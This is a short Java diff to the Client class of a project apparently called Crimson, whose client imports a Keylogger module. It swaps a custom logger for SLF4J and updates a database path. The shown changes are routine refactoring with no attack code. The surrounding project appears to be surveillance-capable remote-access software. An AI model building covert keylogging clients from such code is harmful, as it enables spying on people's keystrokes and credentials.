@@ -23,6 +23,7 @@ import java.util.List;
 import javax.net.ssl.SSLException;
 
 import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.modules.Keylogger.RefreshMethod;
@@ -31,10 +32,9 @@ import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.Platform;
 import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
 import com.subterranean_security.crimson.core.storage.ViewerDB;
-import com.subterranean_security.crimson.core.util.CUtil;
 
 public class Client {
-	private static final Logger log = CUtil.Logging.getLogger(Client.class);
+	private static final Logger log = LoggerFactory.getLogger(Client.class);
 
 	public static ClientConnector connector;
 	public static ViewerDB clientDB;
@@ -56,7 +56,7 @@ public class Client {
 
 		List<NetworkTarget> nts = null;
 		try {
-			clientDB = new ViewerDB(new File(Common.base + "/var/client.db"));
+			clientDB = new ViewerDB(new File(Common.Directories.base + "/var/client.db"));
 			nts = getExternalNts();
 		} catch (Exception e) {
 			// TODO: handle exception
